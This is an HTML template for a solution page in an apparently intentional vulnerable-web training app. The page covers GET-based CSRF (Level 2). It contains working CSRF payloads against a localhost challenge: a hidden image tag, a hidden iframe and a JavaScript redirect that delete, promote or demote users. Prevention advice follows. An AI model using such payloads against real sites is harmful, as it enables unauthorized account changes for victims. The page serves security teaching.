{% extends 'base.html' %}

{% block title %}Solution: CSRF Level 2{% endblock %}

{% block content %}
<div class="row">
    <div class="col-md-8 offset-md-2">
        <div class="card">
            <div class="card-header">
                <h2 class="text-center"><i class="bi bi-check-circle-fill text-success me-2"></i>Solution: Level 2 - GET-based CSRF</h2>
            </div>
            <div class="card-body solution-content">
                <h3>Vulnerability Explanation</h3>
                <p>
                    This page contains a GET-based CSRF vulnerability where sensitive administrative actions
                    are performed through GET requests instead of POST requests. This makes the application
                    vulnerable to CSRF attacks that can be triggered through simple HTML elements.
                </p>
                <p>
                    The vulnerability exists because:
                </p>
                <ul>
                    <li>State-changing operations use GET requests</li>
                    <li>No CSRF protection mechanisms are implemented</li>
                    <li>Actions can be triggered through image tags, links, or iframes</li>
                    <li>No additional confirmation required for sensitive operations</li>
                </ul>
                
                <h3>Solution</h3>
                <p>To solve this challenge, you can use various HTML elements to automatically trigger the vulnerable endpoint:</p>
                <div class="alert alert-secondary">
                    <code>&lt;!-- Save as malicious.html and open in browser --&gt;</code>
                </div>
                <pre><code>&lt;!-- Method 1: Hidden image tag (executes automatically) --&gt;
&lt;img src="http://localhost:5000/csrf/level2?action=delete&user_id=victim" width="1" height="1"&gt;

&lt;!-- Method 2: Hidden iframe (executes automatically) --&gt;
&lt;iframe src="http://localhost:5000/csrf/level2?action=promote&user_id=attacker" style="display:none"&gt;&lt;/iframe&gt;

&lt;!-- Method 3: JavaScript redirect (executes automatically) --&gt;
&lt;script&gt;
window.location = 'http://localhost:5000/csrf/level2?action=demote&user_id=admin';
&lt;/script&gt;</code></pre>
                <p>
                    The simplest approach is to use an image tag that automatically loads when the page opens,
                    triggering the CSRF attack without any user interaction.
                </p>
                
                <h3>Real-world Impact</h3>
                <p>
                    GET-based CSRF vulnerabilities are particularly dangerous because they can be exploited through:
                </p>
                <ul>
                    <li>Email links that execute when previewed</li>
                    <li>Social media posts with embedded images</li>
                    <li>Forum signatures with hidden image tags</li>
                    <li>Chat applications that auto-load images</li>
                    <li>Advertisement networks serving malicious content</li>
                </ul>
                
                <h3>Prevention</h3>
                <p>To prevent GET-based CSRF vulnerabilities, developers should:</p>
                <ul>
                    <li>Never use GET requests for state-changing operations</li>
                    <li>Use POST, PUT, or DELETE methods with proper CSRF tokens</li>
                    <li>Implement the RESTful principle: GET should be idempotent</li>
                    <li>Require explicit user confirmation for sensitive actions</li>
                    <li>Validate the Origin and Referer headers</li>
                    <li>Use SameSite cookie attributes to prevent cross-site requests</li>
                    <li>Implement proper authentication and authorization checks</li>
                </ul>
                
                <div class="mt-4">
                    <a href="{{ url_for('csrf_level2') }}" class="btn btn-outline-primary">Back to Challenge</a>
                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end">All Challenges</a>
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}